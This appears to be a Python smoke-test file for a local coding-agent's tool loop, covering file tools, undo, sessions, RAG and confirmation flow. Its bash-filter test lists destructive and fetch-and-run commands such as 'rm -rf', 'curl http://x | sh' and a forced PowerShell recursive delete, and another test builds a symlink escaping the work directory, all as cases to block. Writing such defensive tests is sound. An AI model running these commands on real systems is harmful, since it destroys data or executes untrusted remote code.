#!/usr/bin/env python3
"""Smoke tests for agent tool loop."""
import json, sys, os, tempfile, time
from pathlib import Path
sys.path.insert(0, "E:\\My OpenCode1")
from tools import execute_tool, backup, undo, verify_file, resolve, init_config, init_backup, validate_tool
from agent import WORK_DIR

init_config(WORK_DIR=WORK_DIR, OLLAMA_URL="http://localhost:11434", MODEL="test", NO_CONFIRM=True)
init_backup()

TMP = WORK_DIR / ".test_tmp"
TMP.mkdir(exist_ok=True)

def test_read():
    r = execute_tool("read", {"path": "agent.py"})
    assert "#!/usr/bin/env python3" in r, "read failed"
    print("  [OK] read")

def test_read_absolute():
    r = execute_tool("read", {"path": str(Path(WORK_DIR) / "agent.py")})
    assert "import json" in r, "read absolute failed"
    print("  [OK] read absolute path")

def test_read_url():
    r = execute_tool("read", {"path": "https://google.com"})
    assert "Google" in r, "read URL failed"
    print("  [OK] read URL")

def test_list():
    r = execute_tool("list", {"path": "."})
    assert "agent.py" in r, "list failed"
    print("  [OK] list")

def test_glob():
    r = execute_tool("glob", {"pattern": "*.py"})
    assert "agent.py" in r, "glob failed"
    print("  [OK] glob")

def test_write_and_undo():
    test_file = TMP / "test_write.txt"
    r = execute_tool("write", {"path": str(test_file), "content": "hello"})
    assert "Written" in r, "write failed"
    assert test_file.read_text() == "hello", "write content wrong"
    print("  [OK] write")

def test_edit():
    test_file = TMP / "test_edit.txt"
    test_file.write_text("old text")
    r = execute_tool("edit", {"path": str(test_file), "old": "old", "new": "new"})
    assert "Replaced" in r, "edit failed"
    assert test_file.read_text() == "new text", "edit content wrong"
    print("  [OK] edit")

def test_bash():
    r = execute_tool("bash", {"cmd": "echo hello"})
    assert "hello" in r, "bash failed"
    print("  [OK] bash")

def test_verify_py():
    r = verify_file(str(Path(WORK_DIR) / "agent.py"))
    print(f"  [OK] verify .py (result: {'OK' if not r else r[:50]})")

def test_verify_json():
    jf = TMP / "test.json"
    jf.write_text('{"a": 1}')
    r = verify_file(str(jf))
    print(f"  [OK] verify .json")

def test_backup_undo():
    tf = TMP / "test_bu.txt"
    tf.write_text("v1")
    backup(str(tf))
    tf.write_text("v2")
    r = execute_tool("undo", {"path": str(tf)})
    assert tf.read_text() == "v1", f"undo failed: {tf.read_text()}"
    print("  [OK] backup + undo")

def test_db_query():
    r = execute_tool("db_query", {"query": "SELECT 1 as a, 'x' as b"})
    assert "a | b" in r and "1 | x" in r, f"db_query failed: {r}"
    print("  [OK] db_query")

def test_testgen():
    f = TMP / "sample_mod.py"
    f.write_text("def add(a, b):\n    return a + b\n\ndef mul(a, b):\n    return a * b\n")
    r = execute_tool("testgen", {"path": str(f)})
    tp = TMP / "test_sample_mod.py"
    assert "Generated" in r and tp.exists(), f"testgen failed: {r}"
    content = tp.read_text()
    assert "test_add" in content and "test_mul" in content, "testgen missing functions"
    print("  [OK] testgen")

def test_validation():
    r = validate_tool({"tool": "write"})
    assert "Missing required" in r, "validation should reject missing content"
    r2 = validate_tool({"tool": "nope", "path": "x"})
    assert "Unknown tool" in r2, "validation should reject unknown tool"
    print("  [OK] validation")

def test_save_api():
    import requests
    from agent import app
    import threading, uvicorn
    # Use TestClient-style via running server is heavy; test endpoint via app
    # Direct: build the endpoint call
    from fastapi.testclient import TestClient
    client = TestClient(app)
    r = client.put("/api/file", json={"path": ".test_tmp/api_save.txt", "content": "saved"})
    assert r.json().get("ok"), f"save API failed: {r.json()}"
    assert (WORK_DIR / ".test_tmp/api_save.txt").read_text() == "saved"
    print("  [OK] save API (PUT /api/file)")

def test_terminal_api():
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    r = client.post("/api/terminal", json={"cmd": "echo term_test_123", "cwd": ""})
    assert r.status_code == 200, f"terminal status {r.status_code}"
    assert "term_test_123" in r.text, f"terminal output missing: {r.text[:200]}"
    assert '"done": true' in r.text, "terminal missing done event"
    r2 = client.post("/api/terminal/kill")
    assert r2.json().get("killed", 0) >= 0
    print("  [OK] terminal (SSE)")

def test_deps_tool():
    r = execute_tool("deps", {})
    assert isinstance(r, str) and len(r) > 0, f"deps failed: {r}"
    assert "requirements" in r.lower() or "package" in r.lower() or "No dependency" in r, f"deps output unexpected: {r[:100]}"
    print("  [OK] deps")

def test_audit():
    log_file = WORK_DIR / ".agent_audit.log"
    before = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    execute_tool("list", {"path": "."})
    after = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    assert len(after) > len(before), "audit log not appended"
    lines = [l for l in after.splitlines() if l.strip()]
    assert any("list" in l for l in lines[-3:]), f"audit missing tool name: {lines[-3:]}"
    print("  [OK] audit log")

def test_rag_cache_incremental():
    from rag import init_rag, rag_search, _FILE_STATS
    import shutil
    rdir = WORK_DIR / ".test_rag"
    shutil.rmtree(rdir, ignore_errors=True)
    rdir.mkdir(exist_ok=True)
    (rdir / "a.py").write_text("def alpha_func():\n    return 1\n", encoding="utf-8")
    init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=rdir, EMBED_MODEL="nomic-embed-text")
    results = rag_search("alpha_func", top_k=5)
    assert isinstance(results, str) and "a.py" in results, f"rag search failed: {results}"
    stats1 = dict(_FILE_STATS)
    results2 = rag_search("alpha_func", top_k=5)
    stats2 = dict(_FILE_STATS)
    assert stats1 == stats2, "cache should be reused on unchanged file"
    (rdir / "a.py").write_text("def alpha_func():\n    return 2\n\ndef beta_marker():\n    pass\n", encoding="utf-8")
    rag_search("alpha_func", top_k=5)
    stats3 = dict(_FILE_STATS)
    assert stats3 != stats2, "cache should rebuild for changed file"
    shutil.rmtree(rdir, ignore_errors=True)
    print("  [OK] RAG incremental cache")

def test_agent_loop_tool_call():
    """Integration: loop parses tool block, executes it, then returns final text."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return 'I will list files.\n```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        events = []
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list files please"}], None,
            events=lambda e: events.append(e))
    finally:
        agent_mod.call_ollama = original
    assert "Done after listing." in out, f"final text missing: {out[:300]}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    assert any(e.get("type") == "tool" and e.get("name") == "list" for e in events), \
        f"live tool event missing: {events}"
    print("  [OK] agent loop: tool execution + live events")

def test_agent_loop_plain_text():
    """Integration: loop returns plain text without tools (planner pass + main model)."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return "Just a plain answer.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hello"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "Just a plain answer." in out, f"plain loop failed: {out[:200]}"
    assert calls["n"] == 2, f"expected planner+main calls, got {calls['n']}"
    print("  [OK] agent loop: plain text")

def test_agent_loop_yaml_style_tool():
    """Integration: yaml-style `tool <name>` blocks (non-JSON) are parsed and executed."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ('I will write the file.\n```python\n'
                    'tool write\npath "demo_yaml.py"\n'
                    'content "def add(a,b): return a+b"\n```'), 10
        return "File created.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = True
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "create file"}], None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
    assert "File created." in out, f"final text missing: {out[:300]}"
    p = WORK_DIR / "demo_yaml.py"
    assert p.exists(), "yaml-style write tool did not create file"
    assert "def add" in p.read_text("utf-8"), "file content mismatch"
    p.unlink(missing_ok=True)
    print("  [OK] agent loop: yaml-style tool blocks")

def test_agent_loop_planner_fallback():
    """Integration: planner (1.5b) without tool blocks doesn't kill the loop — main model retries."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        if len(calls) == 1:
            return "I'll just explain...", 5
        if len(calls) == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list"}], None)
    finally:
        agent_mod.call_ollama = original
    assert len(calls) == 3, f"expected planner+main+final calls, got {len(calls)}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: planner fallback to main model")

def test_confirm_yes_autoexec():
    """Bug: 'yes' after [CONFIRM] must re-execute the tool without a model call."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "write", "path": "confirm_demo.txt", "content": "hello"}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = False
    sid = "test-confirm"
    agent_mod._PENDING_CONFIRM.clear()
    try:
        out1 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"}], sid)
        assert "[CONFIRM]" in out1, f"expected CONFIRM prompt: {out1[:200]}"
        assert not (WORK_DIR / "confirm_demo.txt").exists(), "file written before confirmation!"
        assert calls["n"] == 1, f"model should be called once before confirm, got {calls['n']}"
        p = agent_mod._PENDING_CONFIRM.get(sid)
        assert p and p[0] == "write", f"pending not stored: {agent_mod._PENDING_CONFIRM}"
        out2 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"},
             {"role": "user", "content": "yes"}], sid)
        assert (WORK_DIR / "confirm_demo.txt").exists(), "tool not executed after 'yes'"
        assert "hello" in (WORK_DIR / "confirm_demo.txt").read_text("utf-8")
        assert calls["n"] == 2, f"model calls: 1st request + final answer expected, got {calls['n']}"
        assert "confirm_demo.txt" in out2, f"result missing from output: {out2[:300]}"
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
        agent_mod._PENDING_CONFIRM.clear()
        (WORK_DIR / "confirm_demo.txt").unlink(missing_ok=True)
    print("  [OK] confirm flow: 'yes' auto-executes tool")

def test_agent_loop_model_param():
    """User-selected model must reach call_ollama (and skip the planner)."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "Just text.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], None, None, "qwen2.5-coder:7b")
    finally:
        agent_mod.call_ollama = original
    assert calls and all(m == "qwen2.5-coder:7b" for m in calls), \
        f"model param not honored: {calls}"
    assert len(calls) == 1, f"planner should be skipped entirely, got {len(calls)} calls"
    print("  [OK] agent loop: model param overrides planner")

def test_validate_tool_types():
    """Kimi P1: argument type/range validation (top_k>0, task.agent, todo.action, lsp.op)."""
    from tools import validate_tool
    cases = [
        ({"tool": "search", "query": "x", "top_k": 0}, True),
        ({"tool": "search", "query": "x", "top_k": 100}, True),
        ({"tool": "search", "query": "x", "top_k": 5}, False),
        ({"tool": "search", "query": 42}, True),
        ({"tool": "task", "agent": "hacker", "prompt": "x"}, True),
        ({"tool": "task", "agent": "explore", "prompt": "x"}, False),
        ({"tool": "todo", "action": "delete", "items": []}, True),
        ({"tool": "todo", "action": "complete", "index": 1}, False),
        ({"tool": "lsp", "operation": "hack", "path": "a.py"}, True),
        ({"tool": "lsp", "operation": "rename", "path": "a.py", "line": 0, "character": 0}, False),
        ({"tool": "bash", "cmd": 123}, True),
        ({"tool": "bash", "cmd": "echo hi"}, False),
        ({"tool": "mcp", "server": "fs"}, True),
        ({"tool": "mcp", "server": "fs", "call": "read_file", "args": {}}, False),
    ]
    for tc, expect_err in cases:
        err = validate_tool(tc)
        if expect_err:
            assert err, f"expected validation error for {tc}"
        else:
            assert not err, f"unexpected error for {tc}: {err}"
    print("  [OK] validate_tool: types/ranges/enums")

def test_symlink_safe_path():
    """Symlink/junction escaping WORK_DIR must be blocked."""
    import tools
    outside = Path(tempfile.mkdtemp())
    (outside / "secret.txt").write_text("s3cr3t", "utf-8")
    link = TMP / "evil_link"
    try:
        if hasattr(os, "symlink"):
            os.symlink(outside, link, target_is_directory=True)
        else:
            os.link(outside, link)
        if link.exists():
            rel = os.path.relpath(link)
            err = tools.ensure_safe_path(str(link))
            assert err is not None, "symlink escape must be blocked"
            err2 = tools.ensure_safe_path(rel)
            assert err2 is not None, "relative symlink escape must be blocked"
            print("  [OK] symlink/junction escape blocked")
        else:
            print("  [SKIP] symlink creation unsupported")
    except OSError as e:
        print(f"  [SKIP] symlink unsupported: {e}")
    finally:
        import shutil
        shutil.rmtree(outside, ignore_errors=True)
        shutil.rmtree(link, ignore_errors=True)

def test_main_model_freeform_retry():
    """Main model free-form answer (no tool blocks) gets one strict retry."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return "First I will explain the approach in detail and then do it.", 10
        if calls["n"] == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list"}], None, None, agent_mod.MODEL)
    finally:
        agent_mod.call_ollama = original
    assert calls["n"] == 3, f"expected free-form retry + tool + final, got {calls['n']}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: free-form retry with strict hint")

def test_question_stops_loop():
    """Question tool ends the iteration (waits for user answer) instead of looping."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "question", "text": "Which approach?", "options": ["A", "B"]}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "[QUESTION]" in out, f"question not shown: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after question, got {calls['n']} calls"
    print("  [OK] agent loop: question stops iteration")

def test_repeated_tool_blocked():
    """Identical tool call repeated twice in a row must be blocked (anti-loop)."""
    import agent as agent_mod
    f = WORK_DIR / "repeat_target.txt"
    f.write_text("content here", "utf-8")
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "read", "path": "repeat_target.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read it"}], None)
    finally:
        agent_mod.call_ollama = original
        f.unlink(missing_ok=True)
    assert "identical call repeated" in out, f"repeat not blocked: {out[:300]}"
    assert calls["n"] == 2, f"expected 2 iterations then block, got {calls['n']}"
    print("  [OK] agent loop: identical repeat blocked")

def test_missing_tool_key_stops_loop():
    """Broken blocks (no 'tool' key) repeated twice in a row must stop the loop."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return ("```tool\n{}\n```\n```tool\n{}\n```\n```tool\n{}\n```", 10)
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "do it"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "identical call repeated" in out, f"broken blocks not blocked: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after broken blocks, got {calls['n']} calls"
    print("  [OK] agent loop: broken tool blocks blocked")

def test_timeout_env():
    """AGENT_TIMEOUT must cap the loop and return a TIMEOUT marker."""
    import agent as agent_mod
    import time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.3)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    os.environ["AGENT_TIMEOUT"] = "0.05"
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read x"}], None)
    finally:
        agent_mod.call_ollama = original
        os.environ.pop("AGENT_TIMEOUT", None)
    assert "TIMEOUT" in out, f"timeout marker missing: {out[:200]}"
    assert calls["n"] == 1, f"loop should stop before 2nd call, got {calls['n']}"
    print("  [OK] agent loop: timeout respected")

def test_cancel_flag():
    """Cancel flag must stop the agent loop between iterations."""
    import agent as agent_mod
    import threading, time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.5)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    sid = "cancel_test"
    agent_mod._cancel_clear(sid)
    out = {}
    def worker():
        out["r"] = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], sid)
    t = threading.Thread(target=worker)
    try:
        t.start()
        _time.sleep(0.15)
        agent_mod._cancel_set(sid)
        t.join(timeout=10)
    finally:
        agent_mod.call_ollama = original
        agent_mod._cancel_clear(sid)
    assert not t.is_alive(), "loop did not stop after cancel"
    assert "[cancelled]" in out.get("r", ""), f"cancel marker missing: {out.get('r','')[:200]}"
    print(f"  [OK] agent loop: cancel flag respected ({calls['n']} calls)")

def test_rag_split_chunk():
    """Size-based chunking with overlap (DeepSeek P1)."""
    from rag import _split_chunk
    t = "x" * 1300
    parts = _split_chunk(t, 500, 80)
    assert len(parts) == 3, len(parts)
    assert all(len(p) <= 500 for p in parts)
    assert parts[0] == "x" * 500 and len(parts[-1]) == 460
    assert parts[0][420:] == parts[1][:80], "overlap missing"
    assert _split_chunk("short", 500, 80) == ["short"]
    print("  [OK] rag split chunk (size + overlap)")

def test_session_search():
    """Full-text search across session messages."""
    import agent as agent_mod
    sid = "srch_" + str(int(time.time()))
    agent_mod.save_session(sid, "Search me",
        [{"role": "user", "content": "Как работает потоковый SSE в агенте?"}])
    try:
        res = agent_mod.search_sessions(q="потоковый")
        assert any(r["id"] == sid for r in res), f"not found: {res}"
        r = next(r for r in res if r["id"] == sid)
        assert r["snippets"] and "потоковый" in r["snippets"][0]
        assert agent_mod.search_sessions(q="несуществующеесловоxyz") == []
    finally:
        agent_mod.delete_session_db(sid)
    print("  [OK] session full-text search")

def test_agent_loop_shell_alias():
    """Integration: 'shell' alias maps to bash and executes."""
    import agent as agent_mod
    def mock_ollama(msgs, model):
        return '```tool\n{"tool": "shell", "cmd": "echo alias_ok"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "echo"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "alias_ok" in out, f"alias result missing: {out[:300]}"
    print("  [OK] agent loop: shell alias -> bash")

def test_sessions_sqlite():
    """CRUD on sessions via SQLite storage (with JSON fallback)."""
    from fastapi.testclient import TestClient
    import agent as agent_mod, shutil
    tmp_sessions = WORK_DIR / ".test_sess"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        client = TestClient(agent_mod.app)
        r = client.post("/api/sessions", json={"title": "SQLite test"})
        assert r.status_code == 200, f"create: {r.status_code} {r.text}"
        sid = r.json()["id"]
        assert client.post("/api/sessions", json={}).status_code == 200
        # save messages
        assert agent_mod.save_session(sid, "SQLite test",
            [{"role": "user", "content": "hello"}, {"role": "assistant", "content": "hi"}]), "save failed"
        s = agent_mod.load_session(sid)
        assert s and s["title"] == "SQLite test" and len(s["messages"]) == 2, f"load: {s}"
        r = client.get(f"/api/sessions/{sid}")
        assert r.json()["messages"][1]["content"] == "hi", f"get: {r.json()}"
        assert (tmp_sessions / "sessions.db").exists(), "db file missing"
        # list + export
        r = client.get("/api/sessions")
        assert any(x["id"] == sid for x in r.json()), f"list missing session: {r.json()}"
        r = client.get(f"/api/sessions/{sid}/export")
        assert r.json()["messages"], "export empty"
        # delete
        assert client.delete(f"/api/sessions/{sid}").json().get("ok")
        assert agent_mod.load_session(sid) is None, "session not deleted"
        # import
        r = client.post("/api/sessions/import", json={"title": "imp", "messages": [{"role": "user", "content": "x"}]})
        assert r.json().get("id"), "import failed"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions SQLite CRUD")

def test_session_json_migration():
    """Legacy JSON session files are imported into SQLite."""
    import agent as agent_mod, shutil, json as json_mod
    tmp_sessions = WORK_DIR / ".test_migr"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        legacy = tmp_sessions / "legacy_1.json"
        legacy.write_text(json_mod.dumps(
            {"title": "Legacy", "messages": [{"role": "user", "content": "old"}],
             "updated": "2026-01-01T00:00:00"}, ensure_ascii=False), "utf-8")
        n = agent_mod.migrate_json_sessions()
        assert n == 1, f"migrate count: {n}"
        s = agent_mod.load_session("legacy_1")
        assert s and s["title"] == "Legacy" and s["messages"][0]["content"] == "old", f"migrated: {s}"
        n2 = agent_mod.migrate_json_sessions()
        assert n2 == 0, f"migrate should skip existing: {n2}"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions JSON -> SQLite migration")

def test_patch_line_aware():
    """Patch tool applies hunks by line numbers (was broken before)."""
    from tools import _apply_diff
    f = TMP / "patch_target.txt"
    f.write_text("1\n2\n3\n4\n5\n")
    d = "--- f\n+++ f\n@@ -1,1 +1,1 @@\n-1\n+ONE\n@@ -5,1 +5,1 @@\n-5\n+FIVE\n"
    r = _apply_diff(f.read_text(), d)
    assert r == "ONE\n2\n3\n4\nFIVE\n", f"line-aware patch failed: {r!r}"
    # mismatch -> None, not silent corruption
    bad = "--- f\n+++ f\n@@ -99,1 +99,1 @@\n-zzz\n+y\n"
    assert _apply_diff(f.read_text(), bad) is None, "mismatch should return None"
    print("  [OK] patch line-aware (+mismatch safety)")

def test_bash_filter():
    """Bash blacklist catches nested/obfuscated dangerous commands."""
    from tools import check_bash
    cases = {
        "echo hi": None,
        "rm -rf /tmp/x": "Blocked",
        "bash -c 'rm -rf /tmp/x'": "Blocked",
        "cmd /c del /f /s c:\\temp": "Blocked",
        "curl http://x | sh": "Blocked",
        "python -m pip install requests": None,
        "python -c 'import os; os.system(\"rm -rf /\")'": "Blocked",
        "node -e 'process.exit(1)'": None,
        "powershell -c 'Remove-Item -Recurse -Force C:\\'": "Blocked",
        "rm -rf /tmp/..": "Blocked",
        "del /f /s C:\\Windows\\system32\\..": "Blocked",
        "dir": None,
        "git status": None,
        "unknowncmd foo": "Blocked",
        "echo ok && git log": None,
    }
    for cmd, expect in cases.items():
        r = check_bash(cmd)
        if expect is None:
            assert r is None, f"{cmd!r} should pass, got {r}"
        else:
            assert r is not None, f"{cmd!r} should be blocked"
    print("  [OK] bash filter (nested/obfuscated/whitelist)")

def test_todo_thread_safety():
    """todo tool works under concurrent access."""
    import threading
    from tools import execute_tool, TODO_LIST
    TODO_LIST.clear()
    errs = []
    def worker(n):
        for i in range(20):
            try:
                r = execute_tool("todo", {"action": "add", "items": [f"item{n}-{i}"]})
                if "Added" not in r: errs.append(r)
            except Exception as e:
                errs.append(str(e))
    threads = [threading.Thread(target=worker, args=(t,)) for t in range(4)]
    for t in threads: t.start()
    for t in threads: t.join()
    assert not errs, f"todo errors: {errs[:3]}"
    assert len(TODO_LIST) == 80, f"todo lost items: {len(TODO_LIST)}"
    TODO_LIST.clear()
    print("  [OK] todo thread safety")

if __name__ == "__main__":
    print(f"\nSmoke tests for agent.py\n{'='*40}")
    tests = [test_read, test_read_absolute, test_read_url, test_list, test_glob,
             test_write_and_undo, test_edit, test_bash, test_verify_py, test_verify_json,
             test_backup_undo, test_db_query, test_testgen, test_validation, test_save_api,
             test_terminal_api, test_deps_tool, test_audit, test_rag_cache_incremental,
             test_agent_loop_tool_call, test_agent_loop_plain_text, test_agent_loop_shell_alias,
             test_agent_loop_yaml_style_tool, test_agent_loop_planner_fallback,
             test_confirm_yes_autoexec, test_agent_loop_model_param,
             test_validate_tool_types, test_symlink_safe_path, test_main_model_freeform_retry,
             test_question_stops_loop, test_repeated_tool_blocked,
             test_missing_tool_key_stops_loop, test_timeout_env, test_cancel_flag,
             test_sessions_sqlite, test_session_json_migration,
             test_patch_line_aware, test_bash_filter, test_todo_thread_safety,
             test_rag_split_chunk, test_session_search]
    passed = 0
    for t in tests:
        try:
            t()
            passed += 1
        except Exception as e:
            print(f"  [FAIL] {t.__name__}: {e}")
    import shutil
    shutil.rmtree(TMP, ignore_errors=True)
    print(f"\n{'='*40}\n{passed}/{len(tests)} passed")
